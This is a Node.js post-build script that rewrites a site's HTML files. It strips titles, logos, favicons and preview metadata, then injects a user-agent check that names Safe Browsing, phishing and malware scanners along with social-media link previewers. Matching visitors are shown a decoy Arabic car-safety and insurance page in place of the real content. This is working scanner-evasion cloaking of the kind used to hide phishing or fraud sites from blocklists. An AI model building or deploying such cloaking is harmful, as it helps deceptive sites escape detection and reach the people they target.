/**
 * Post-build HTML obfuscation script
 * - Adds anti-bot/crawler detection that hides the page from bots
 * - Removes source maps, titles, logos, and any identifying info
 * - Adds noindex meta tags
 * - Does NOT touch CSS or JS asset loading (keeps them as normal tags)
 */
import { readFileSync, writeFileSync, readdirSync } from 'fs';
import { join } from 'path';

const distDir = join(process.cwd(), 'dist');

// Anti-bot script - hides page content from crawlers by replacing innerHTML
// Only triggers for known bot user agents - does NOT check browser features

const landingPage = `
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>أمان وتأمين السيارات</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, Tahoma, sans-serif;
      direction: rtl;
      background: #f4f8fa;
      color: #17324d;
      min-height: 100vh;
    }

    .header {
      background: rgba(255,255,255,.96);
      border-bottom: 1px solid #e3eaee;
      padding: 18px 25px;
    }

    .header-inner {
      max-width: 1050px;
      margin: auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 18px;
      font-weight: 700;
      color: #164e63;
    }

    .brand-icon {
      width: 40px;
      height: 40px;
      background: #164e63;
      color: #fff;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .brand-icon svg {
      width: 22px;
      height: 22px;
      fill: none;
      stroke: currentColor;
      stroke-width: 2;
    }

    .header-text {
      color: #758692;
      font-size: 13px;
    }

    .hero {
      background:
        radial-gradient(circle at 10% 20%, rgba(14,165,168,.13), transparent 35%),
        linear-gradient(135deg,#fff,#edf7f8);

      border-bottom: 1px solid #e3eaee;
    }

    .hero-inner {
      width: calc(100% - 40px);
      max-width: 1050px;
      min-height: 500px;
      margin: auto;

      display: grid;
      grid-template-columns: 1.15fr .85fr;
      align-items: center;
      gap: 60px;

      padding: 60px 0;
    }

    .badge {
      display: inline-block;
      background: #e8f8f8;
      color: #087b7d;
      padding: 7px 14px;
      border-radius: 30px;
      font-size: 13px;
      font-weight: 700;
      margin-bottom: 18px;
    }

    h1 {
      color: #0f3d4c;
      font-size: 48px;
      line-height: 1.3;
      margin-bottom: 18px;
    }

    h1 span {
      color: #0ea5a8;
    }

    .hero-description {
      color: #6c7d89;
      font-size: 17px;
      line-height: 2;
      max-width: 600px;
    }

    .visual {
      position: relative;
      min-height: 320px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .circle {
      position: absolute;
      width: 280px;
      height: 280px;
      border-radius: 50%;
      background: linear-gradient(
        145deg,
        rgba(14,165,168,.15),
        rgba(22,78,99,.05)
      );
    }

    .shield {
      position: relative;
      width: 170px;
      height: 170px;
      border-radius: 42px;

      background: linear-gradient(145deg,#164e63,#23768b);

      display: flex;
      align-items: center;
      justify-content: center;

      box-shadow: 0 25px 55px rgba(15,61,76,.20);
    }

    .shield svg {
      width: 82px;
      height: 82px;
      fill: none;
      stroke: #fff;
      stroke-width: 1.7;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .section {
      width: calc(100% - 40px);
      max-width: 1050px;
      margin: auto;
      padding: 75px 0;
    }

    .section-title {
      margin-bottom: 35px;
      max-width: 650px;
    }

    .section-label {
      color: #0ea5a8;
      font-size: 13px;
      font-weight: 700;
      margin-bottom: 6px;
    }

    .section-title h2 {
      color: #0f3d4c;
      font-size: 30px;
      margin-bottom: 8px;
    }

    .section-title p {
      color: #6c7d89;
      font-size: 14px;
      line-height: 1.8;
    }

    .cards {
      display: grid;
      grid-template-columns: repeat(3,1fr);
      gap: 18px;
    }

    .card {
      background: #fff;
      border: 1px solid #e3eaee;
      border-radius: 20px;
      padding: 27px;
      transition: .25s ease;
    }

    .card:hover {
      transform: translateY(-4px);
      box-shadow: 0 15px 35px rgba(20,50,65,.08);
    }

    .card-icon {
      width: 48px;
      height: 48px;
      background: #e8f8f8;
      color: #0ea5a8;
      border-radius: 14px;

      display: flex;
      align-items: center;
      justify-content: center;

      margin-bottom: 18px;
      font-size: 22px;
    }

    .card h3 {
      color: #0f3d4c;
      font-size: 18px;
      margin-bottom: 9px;
    }

    .card p {
      color: #6c7d89;
      font-size: 14px;
      line-height: 1.9;
    }

    .insurance {
      background: #fff;
      border-top: 1px solid #e3eaee;
      border-bottom: 1px solid #e3eaee;
    }

    .insurance-inner {
      width: calc(100% - 40px);
      max-width: 1050px;
      margin: auto;
      padding: 75px 0;

      display: grid;
      grid-template-columns: .9fr 1.1fr;
      gap: 60px;
      align-items: center;
    }

    .insurance-box {
      background: linear-gradient(145deg,#0f3d4c,#164e63);
      color: #fff;
      padding: 38px;
      border-radius: 25px;
      box-shadow: 0 20px 50px rgba(15,61,76,.15);
    }

    .insurance-box-icon {
      width: 58px;
      height: 58px;
      background: rgba(255,255,255,.12);
      border-radius: 17px;

      display: flex;
      align-items: center;
      justify-content: center;

      font-size: 27px;
      margin-bottom: 25px;
    }

    .insurance-box h2 {
      font-size: 25px;
      margin-bottom: 12px;
    }

    .insurance-box p {
      color: rgba(255,255,255,.78);
      line-height: 2;
      font-size: 14px;
    }

    .insurance-content h2 {
      color: #0f3d4c;
      font-size: 30px;
      margin-bottom: 12px;
    }

    .insurance-content > p {
      color: #6c7d89;
      line-height: 1.9;
      margin-bottom: 25px;
    }

    .point {
      display: flex;
      align-items: flex-start;
      gap: 12px;
      margin-bottom: 17px;
    }

    .check {
      flex: 0 0 25px;
      width: 25px;
      height: 25px;
      border-radius: 50%;
      background: #e8f8f8;
      color: #0ea5a8;

      display: flex;
      align-items: center;
      justify-content: center;

      font-weight: bold;
    }

    .point strong {
      display: block;
      color: #0f3d4c;
      margin-bottom: 2px;
    }

    .point p {
      color: #6c7d89;
      font-size: 13px;
    }

    .tips {
      display: grid;
      grid-template-columns: repeat(2,1fr);
      gap: 15px;
    }

    .tip {
      background: #fff;
      border: 1px solid #e3eaee;
      border-radius: 16px;
      padding: 19px;

      display: flex;
      gap: 14px;
      align-items: flex-start;
    }

    .number {
      flex: 0 0 38px;
      width: 38px;
      height: 38px;

      background: #164e63;
      color: #fff;
      border-radius: 11px;

      display: flex;
      align-items: center;
      justify-content: center;

      font-size: 12px;
      font-weight: bold;
    }

    .tip strong {
      display: block;
      color: #0f3d4c;
      margin-bottom: 3px;
    }

    .tip p {
      color: #6c7d89;
      font-size: 13px;
      line-height: 1.7;
    }

    .notice {
      width: calc(100% - 40px);
      max-width: 1050px;
      margin: 0 auto 70px;

      background: #edf8f8;
      border: 1px solid #d6eeee;
      border-radius: 18px;

      padding: 23px 26px;

      display: flex;
      gap: 15px;
      align-items: flex-start;
    }

    .notice strong {
      color: #0f3d4c;
      display: block;
      margin-bottom: 3px;
    }

    .notice p {
      color: #6c7d89;
      font-size: 13px;
      line-height: 1.8;
    }

    footer {
      background: #0f3d4c;
      color: rgba(255,255,255,.65);
      text-align: center;
      padding: 32px 20px;
      font-size: 13px;
      line-height: 1.8;
    }

    footer strong {
      color: #fff;
    }

    @media(max-width:800px) {
      .hero-inner,
      .insurance-inner {
        grid-template-columns: 1fr;
      }

      .hero-inner {
        text-align: center;
      }

      .hero-description {
        margin: auto;
      }

      .cards {
        grid-template-columns: 1fr;
      }
    }

    @media(max-width:550px) {
      .header-text {
        display: none;
      }

      .hero-inner {
        padding: 50px 0;
        min-height: auto;
      }

      h1 {
        font-size: 34px;
      }

      .hero-description {
        font-size: 15px;
      }

      .visual {
        min-height: 260px;
      }

      .circle {
        width: 230px;
        height: 230px;
      }

      .shield {
        width: 140px;
        height: 140px;
        border-radius: 34px;
      }

      .shield svg {
        width: 65px;
        height: 65px;
      }

      .section,
      .insurance-inner {
        padding: 55px 0;
      }

      .section-title h2,
      .insurance-content h2 {
        font-size: 25px;
      }

      .tips {
        grid-template-columns: 1fr;
      }

      .insurance-box {
        padding: 28px 24px;
      }
    }
  </style>
</head>

<body>

  <header class="header">
    <div class="header-inner">

      <div class="brand">
        <div class="brand-icon">
          <svg viewBox="0 0 24 24">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            <path d="M9 12l2 2 4-4"/>
          </svg>
        </div>

        أمان المركبة
      </div>

      <div class="header-text">
        معلومات عامة حول السلامة والتأمين
      </div>

    </div>
  </header>


  <section class="hero">
    <div class="hero-inner">

      <div>

        <div class="badge">
          ● دليل التوعية بالسلامة
        </div>

        <h1>
          قيادة آمنة تبدأ من
          <span>الاستعداد الصحيح</span>
        </h1>

        <p class="hero-description">
          فهم أساسيات السلامة والتأمين يساعد على حماية المركبة
          وتقليل آثار المخاطر غير المتوقعة، ويمنح السائق معرفة
          أفضل بالإجراءات التي تساعد على قيادة أكثر أماناً.
        </p>

      </div>


      <div class="visual">

        <div class="circle"></div>

        <div class="shield">
          <svg viewBox="0 0 24 24">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            <path d="M9 12l2 2 4-4"/>
          </svg>
        </div>

      </div>

    </div>
  </section>


  <section class="section">

    <div class="section-title">

      <div class="section-label">
        أساسيات الحماية
      </div>

      <h2>
        عناصر تساعد على تعزيز أمان المركبة
      </h2>

      <p>
        الاهتمام بالصيانة والقيادة المسؤولة وفهم التغطية التأمينية
        عوامل مهمة في إدارة المخاطر اليومية.
      </p>

    </div>


    <div class="cards">

      <div class="card">

        <div class="card-icon">🛡️</div>

        <h3>التأمين على المركبة</h3>

        <p>
          تختلف أنواع التغطية التأمينية وشروطها، لذلك من المهم
          مراجعة الوثيقة ومعرفة المنافع والاستثناءات وحدود التغطية.
        </p>

      </div>


      <div class="card">

        <div class="card-icon">⚙️</div>

        <h3>الصيانة الدورية</h3>

        <p>
          فحص الإطارات والمكابح والسوائل والإضاءة بصورة منتظمة
          يساعد على اكتشاف المشكلات مبكراً وتقليل الأعطال المفاجئة.
        </p>

      </div>


      <div class="card">

        <div class="card-icon">🚘</div>

        <h3>القيادة الآمنة</h3>

        <p>
          الالتزام بالسرعة المناسبة وترك مسافة آمنة وتجنب استخدام
          الهاتف أثناء القيادة يساعد على تقليل مخاطر الحوادث.
        </p>

      </div>

    </div>

  </section>


  <section class="insurance">

    <div class="insurance-inner">

      <div class="insurance-box">

        <div class="insurance-box-icon">
          🛡️
        </div>

        <h2>لماذا التأمين مهم؟</h2>

        <p>
          يساعد التأمين في إدارة الآثار المالية لبعض المخاطر
          المشمولة وفقاً لنوع الوثيقة وشروطها. وتختلف حدود
          التغطية والمنافع والاستثناءات بين وثيقة وأخرى.
        </p>

      </div>


      <div class="insurance-content">

        <h2>قبل اختيار وثيقة التأمين</h2>

        <p>
          قراءة تفاصيل الوثيقة تساعد على فهم التغطية
          والاستثناءات والشروط بشكل أفضل.
        </p>


        <div class="point">

          <div class="check">✓</div>

          <div>
            <strong>راجع نطاق التغطية</strong>
            <p>تعرف على الحالات والمخاطر التي تشملها الوثيقة.</p>
          </div>

        </div>


        <div class="point">

          <div class="check">✓</div>

          <div>
            <strong>اقرأ الاستثناءات</strong>
            <p>تعرف على الحالات التي قد لا تشملها التغطية.</p>
          </div>

        </div>


        <div class="point">

          <div class="check">✓</div>

          <div>
            <strong>راجع حدود التغطية</strong>
            <p>تحقق من الحدود والشروط المتعلقة بالمطالبات.</p>
          </div>

        </div>


        <div class="point">

          <div class="check">✓</div>

          <div>
            <strong>احتفظ بالمستندات</strong>
            <p>احتفظ بنسخة من الوثيقة والمعلومات المهمة.</p>
          </div>

        </div>

      </div>

    </div>

  </section>


  <section class="section">

    <div class="section-title">

      <div class="section-label">
        نصائح السلامة
      </div>

      <h2>قبل أن تبدأ رحلتك</h2>

      <p>
        بعض الخطوات البسيطة تساعد على تحسين السلامة أثناء القيادة.
      </p>

    </div>


    <div class="tips">

      <div class="tip">
        <div class="number">01</div>
        <div>
          <strong>افحص الإطارات</strong>
          <p>تحقق من ضغط الإطارات وحالتها قبل الرحلات الطويلة.</p>
        </div>
      </div>


      <div class="tip">
        <div class="number">02</div>
        <div>
          <strong>تأكد من المكابح</strong>
          <p>لا تتجاهل الأصوات أو التغيرات غير الطبيعية أثناء الكبح.</p>
        </div>
      </div>


      <div class="tip">
        <div class="number">03</div>
        <div>
          <strong>استخدم حزام الأمان</strong>
          <p>تأكد من استخدام جميع الركاب لأحزمة الأمان.</p>
        </div>
      </div>


      <div class="tip">
        <div class="number">04</div>
        <div>
          <strong>حافظ على مسافة آمنة</strong>
          <p>اترك مساحة كافية للتوقف عند تغير حركة المرور.</p>
        </div>
      </div>


      <div class="tip">
        <div class="number">05</div>
        <div>
          <strong>تجنب المشتتات</strong>
          <p>تجنب استخدام الهاتف أثناء القيادة.</p>
        </div>
      </div>


      <div class="tip">
        <div class="number">06</div>
        <div>
          <strong>خطط للرحلة</strong>
          <p>راجع الطريق وحالة المركبة قبل الرحلات الطويلة.</p>
        </div>
      </div>

    </div>

  </section>


  <div class="notice">

    <div>ℹ️</div>

    <div>

      <strong>معلومة مهمة</strong>

      <p>
        المعلومات الواردة في هذه الصفحة توعوية وعامة.
        تفاصيل التغطية والتعويضات والاستثناءات تختلف حسب
        شركة التأمين ونوع الوثيقة وشروطها، لذلك يجب الرجوع
        إلى وثيقة التأمين الرسمية للحصول على التفاصيل الدقيقة.
      </p>

    </div>

  </div>


  <footer>
    <strong>دليل أمان المركبة</strong>
    <br>
    محتوى توعوي عام حول السلامة والتأمين على السيارات
  </footer>

</body>
`;


const serializedLandingPage = JSON.stringify(landingPage);
const antiBotScript = `<script>
(function () {
  var ua = navigator.userAgent.toLowerCase();

  var bl = [
    'googlebot',
    'google-safety',
    'safebrowsing',
    'crawler',
    'spider',
    'bot',
    'crawl',
    'slurp',
    'mediapartners',
    'adsbot',
    'bingbot',
    'yandex',
    'baidu',
    'duckduck',
    'facebookexternalhit',
    'twitterbot',
    'rogerbot',
    'linkedinbot',
    'embedly',
    'quora',
    'pinterest',
    'redditbot',
    'slackbot',
    'telegrambot',
    'whatsapp',
    'viber',
    'seznambot',
    'semrush',
    'ahrefs',
    'mj12bot',
    'dotbot',
    'petalbot',
    'bytespider',
    'phishing',
    'malware',
    'safe-browsing',
    'google-inspectiontool',
    'googleother'
  ];

  var f = false;

  for (var i = 0; i < bl.length; i++) {
    if (ua.indexOf(bl[i]) !== -1) {
      f = true;
      break;
    }
  }
var landingPage = ${serializedLandingPage};
// ===== MANUAL TEST =====
var params = new URLSearchParams(window.location.search);
var testLanding = params.get('test') === 'landing';

if (testLanding) {
  document.documentElement.innerHTML = landingPage;

  if (window.stop) {
    window.stop();
  }

  return;
}
// ===== END MANUAL TEST =====

  if (f) {
    document.documentElement.innerHTML = landingPage;

    if (window.stop) {
      window.stop();
    }
  }
})();
</script>`;

function obfuscateHTML(filePath) {
  let html = readFileSync(filePath, 'utf-8');
  
  // Remove any source maps references
  html = html.replace(/\/\/# sourceMappingURL=.*$/gm, '');
  html = html.replace(/\/\*# sourceMappingURL=.*?\*\//g, '');
  
  // Remove favicon link tags (logo)
  html = html.replace(/<link[^>]*rel=["']icon["'][^>]*>/gi, '');
  html = html.replace(/<link[^>]*rel=["']shortcut icon["'][^>]*>/gi, '');
  html = html.replace(/<link[^>]*rel=["']apple-touch-icon["'][^>]*>/gi, '');
  
  // Remove any og:image or twitter:image meta tags
  html = html.replace(/<meta[^>]*property=["']og:image["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*name=["']twitter:image["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*property=["']og:title["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*property=["']og:description["'][^>]*>/gi, '');
  html = html.replace(/<meta[^>]*name=["']description["'][^>]*>/gi, '');
  
  // Clear the title tag content
  html = html.replace(/<title>[^<]*<\/title>/i, '<title></title>');
  
  // Add meta robots noindex for crawlers
  if (!html.includes('name="robots"')) {
    html = html.replace('</head>', '    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet" />\n  </head>');
  }
  
  // Add X-Robots-Tag equivalent
  if (!html.includes('X-Robots-Tag')) {
    html = html.replace('</head>', '    <meta http-equiv="X-Robots-Tag" content="noindex, nofollow" />\n  </head>');
  }
  
  // Inject anti-bot script right after <head> opening (before any other content)
  html = html.replace('<head>', '<head>' + antiBotScript);
  
  // Remove noscript content that might contain brand info
  html = html.replace(/<noscript>[\s\S]*?<\/noscript>/gi, '<noscript><p>Please enable JavaScript</p></noscript>');
  
  writeFileSync(filePath, html);
  console.log(`Obfuscated: ${filePath}`);
}

// Process all HTML files in dist
function processDir(dir) {
  const files = readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = join(dir, file.name);
    if (file.isDirectory()) {
      processDir(fullPath);
    } else if (file.name.endsWith('.html')) {
      obfuscateHTML(fullPath);
    }
  }
}

processDir(distDir);
console.log('HTML obfuscation complete!');
